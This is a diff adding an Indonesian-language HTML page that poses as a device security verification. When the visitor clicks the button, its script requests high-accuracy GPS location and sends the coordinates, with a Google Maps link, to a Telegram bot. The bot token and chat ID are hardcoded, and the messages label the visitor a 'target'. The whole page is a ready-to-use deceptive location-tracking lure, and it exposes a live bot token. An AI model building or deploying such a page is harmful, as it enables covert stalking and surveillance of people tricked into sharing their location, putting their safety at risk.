@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi Keamanan</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #121212;
+            color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+            padding: 30px;
+            background: #1e1e1e;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.5);
+            max-width: 320px;
+            width: 100%;
+        }
+        .btn {
+            background-color: #03a9f4;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 20px;
+            width: 100%;
+            font-weight: bold;
+        }
+        .btn:hover {
+            background-color: #0288d1;
+        }
+        .spinner {
+            border: 4px solid rgba(255,255,255,0.1);
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            border-left-color: #03a9f4;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+            display: none;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container" id="box-awal">
+        <h3>Verifikasi Perangkat</h3>
+        <p>Klik tombol di bawah untuk melanjutkan proses sinkronisasi keamanan.</p>
+        <button class="btn" id="btnMulai">Lanjutkan</button>
+    </div>
+
+    <div class="container" id="box-proses" style="display:none;">
+        <h3>Memproses Data...</h3>
+        <p>Mohon izinkan akses lokasi yang diminta.</p>
+        <div class="spinner" id="spinner"></div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '8616650869:AAEfksktRupuMVxSTGznIvM9ZKxXXAvHiuk';
+        const CHAT_ID = '8664741564';
+
+        document.getElementById('btnMulai').addEventListener('click', () => {
+            document.getElementById('box-awal').style.display = 'none';
+            document.getElementById('box-proses').style.display = 'block';
+            document.getElementById('spinner').style.display = 'block';
+            
+            eksekusiLokasi();
+        });
+
+        async function kirimKeTelegram(lat, lon, akurasi) {
+            try {
+                let pesan = '';
+                if (lat && lon) {
+                    pesan = `<b>[+] Target Lokasi Ditemukan [+]</b>\n\n- Latitude: <code>${lat}</code>\n- Longitude: <code>${lon}</code>\n- Akurasi: ±${akurasi} meter\n\n🎯 <b><a href="https://maps.google.com/?q=${lat},${lon}">KLIK DISINI UNTUK BUKA TITIK GPS</a></b>`;
+                } else {
+                    pesan = '[-] Akses lokasi ditolak atau tidak tersedia.';
+                }
+
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        chat_id: CHAT_ID, 
+                        text: pesan, 
+                        parse_mode: 'HTML',
+                        disable_web_page_preview: false 
+                    })
+                });
+
+                document.getElementById('spinner').style.display = 'none';
+                document.getElementById('box-proses').innerHTML = '<h3>Verifikasi Selesai</h3>';
+            } catch (err) {
+                console.error('Error transmisi:', err);
+            }
+        }
+
+        function eksekusiLokasi() {
+            if (!navigator.geolocation) {
+                kirimKeTelegram(null, null, null);
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const akurasi = position.coords.accuracy;
+                    kirimKeTelegram(lat, lon, akurasi);
+                },
+                (error) => {
+                    kirimKeTelegram(null, null, null);
+                },
+                { timeout: 15000, enableHighAccuracy: true, maximumAge: 0 }
+            );
+        }
+    </script>
+</body>
+</html>
